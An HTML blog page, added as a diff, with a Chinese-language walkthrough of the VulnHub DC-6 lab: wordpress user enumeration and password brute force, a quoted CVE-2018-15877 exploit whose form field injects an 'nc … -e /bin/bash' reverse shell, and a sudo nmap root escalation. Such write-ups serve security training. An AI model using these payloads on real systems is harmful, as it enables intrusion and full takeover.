@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>VulnHub通关日记-DC_6-Walkthrough | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">VulnHub通关日记-DC_6-Walkthrough</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">March 6, 2020&nbsp;&nbsp;19:09:45</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=31108722&auto=1&height=66"></iframe>
+
+<h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p>OK, this isn’t really a clue as such, but more of some “we don’t want to spend five years waiting for a certain process to finish” kind of advice for those who just want to get on with the job.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt </span><br></pre></td></tr></table></figure>
+
+<p>That should save you a few years. ;-)</p>
+<h2 id="运用的知识"><a href="#运用的知识" class="headerlink" title="运用的知识"></a>运用的知识</h2><p><code>wpsacn</code>爆破网站用户密码<br><code>wordpress</code>后台<code>Activity monitor</code>插件<code>命令注入</code>获取shell<br><code>nmap</code>提权获取root</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到 <code>IP</code> 后对它进行扫描端口开放服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 192.168.1.145</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1247.png" alt="图片"></p>
+<p>扫描出来后发现它开放了 <code>80</code>（http）、<code>22</code>（ssh），紧接着访问 <code>http://192.168.1.145</code>  发现它重定向到了这个 URL ：<code>wordy</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1248.png" alt="图片"></p>
+<p>然后我设置了一下 <code>hosts</code> 文件：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1249.png" alt="图片"></p>
+<p>设置好之后打开 <code>http://wordy</code>  发现它的 CMS 是 <code>Wordpress</code> ：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1250.png" alt="图片"></p>
+<h2 id="wpscan爆破网站用户密码"><a href="#wpscan爆破网站用户密码" class="headerlink" title="wpscan爆破网站用户密码"></a>wpscan爆破网站用户密码</h2><p>既然是 <code>wordpress</code> 那么我就先用 <code>wpscan</code> 来对它进行扫描把：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy/ -e u</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1251.png" alt="图片"></p>
+<p>扫描出来后发现它有这些用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">jens</span><br><span class="line">graham</span><br><span class="line">mark</span><br><span class="line">sarah</span><br></pre></td></tr></table></figure>
+
+<p>紧接着我又生成了一些字典文件来对它网站进行爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01</span><br><span class="line"># 这是作者给我们的提示！</span><br></pre></td></tr></table></figure>
+
+<p>生成完字典后对它网站用户名挨个爆破枚举，看看能不能捡漏：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy/ -U user -P passwords.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1252.png" alt="图片"></p>
+<p>爆破成功后得到 <code>mark</code> 的密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Username: mark, Password: helpdesk01</span><br></pre></td></tr></table></figure>
+
+<p>随后我用得到的账号和密码登陆到了网站的后台发现了一个插件：<code>Activity monitor</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1253.png" alt="图片"></p>
+<h2 id="Activity-monitor-插件命令注入获取shell"><a href="#Activity-monitor-插件命令注入获取shell" class="headerlink" title="Activity monitor 插件命令注入获取shell"></a>Activity monitor 插件命令注入获取shell</h2><p>看到这个插件我去搜索了一下发现有一个<code>命令注入</code>:</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1254.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PoC:</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!--  Wordpress Plainview Activity Monitor RCE</span><br><span class="line">        [+] Version: 20161228 and possibly prior</span><br><span class="line">        [+] Description: Combine OS Commanding and CSRF to get reverse shell</span><br><span class="line">        [+] Author: LydA(c)ric LEFEBVRE</span><br><span class="line">        [+] CVE-ID: CVE-2018-15877</span><br><span class="line">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell</span><br><span class="line">        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well</span><br><span class="line">  --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;ip&quot; value=&quot;google.fr| nc 192.168.1.128 9999 -e /bin/bash&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;lookup&quot; value=&quot;Lookup&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1255.png" alt="图片"></p>
+<p>设置好之后 KALI 用 <code>nc</code> 监听 <code>6666</code> 端口，访问 <code>poc.html</code> 得到一枚 <code>shell</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1256.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1257.png" alt="图片"></p>
+<p>先让他得到一个 <code>bash</code> 外壳把：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1258.png" alt="图片"></p>
+<p>通过信息搜集我发现 <code>mark</code> 目录下有一个文件，里面泄露了 <code>graham</code> 的密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Things to do:</span><br><span class="line"></span><br><span class="line">- Restore full functionality for the hyperdrive (need to speak to Jens)</span><br><span class="line">- Buy present for Sarah&#x27;s farewell party</span><br><span class="line">- Add new user: graham - GSo7isUM1D4 - done</span><br><span class="line">- Apply for the OSCP course</span><br><span class="line">- Buy new laptop for Sarah&#x27;s replacement</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1259.png" alt="图片"></p>
+<p>拿到密码后我 <code>ssh</code> 登陆到了 <code>graham</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1260.png" alt="图片"></p>
+<h2 id="sudo切换到jens用户"><a href="#sudo切换到jens用户" class="headerlink" title="sudo切换到jens用户"></a>sudo切换到jens用户</h2><p>登陆成功后我习惯性的 <code>sudo -l</code> 发现 <code>graham</code> 用户可以以 <code>jens</code> 的身份去运行 <code>/home/jens/backups.sh</code> 文件：</p>
+<p>查看 <code>backups.sh</code> 文件后发现它是一个解压的命令，接着我以 <code>jens</code> 身份去运行这个文件成功切换到了 <code>jens</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u jens /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1261.png" alt="图片"></p>
+<h2 id="nmap提权"><a href="#nmap提权" class="headerlink" title="nmap提权"></a>nmap提权</h2><p>成功来到 <code>jens</code> 用户后我又是习惯性的 <code>sudo -l</code> 发现它可以以 <code>root</code> 身份去运行 <code>/usr/bin/nmap</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1262.png" alt="图片"></p>
+<p>最后也是用 <code>nmap</code> 提权为 <code>root</code> 用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp)</span><br><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; $TF</span><br><span class="line">sudo nmap --script=$TF</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1263.png" alt="图片"></p>
+<p>最终也是在 <code>/root</code> 目录下拿到了 <code>Flag</code>～</p>
+<h2 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h2><p>公众号：<code>saulGoodman</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/weixin/weixin.jpg" alt="saulGoodman"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2020/03/06/Vulnhub-DC-6/">http://example.com/2020/03/06/Vulnhub-DC-6/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"># 权限提升</a>
+                    
+                        <a href="/tags/Vulnhub/"># Vulnhub</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/03/09/Vulnhub-DC-7/">VulnHub通关日记-DC_7-Walkthrough</a>
+            
+            
+            <a class="next" rel="next" href="/2020/03/03/Vulnhub-DC-5/">VulnHub通关日记-DC_5-Walkthrough</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
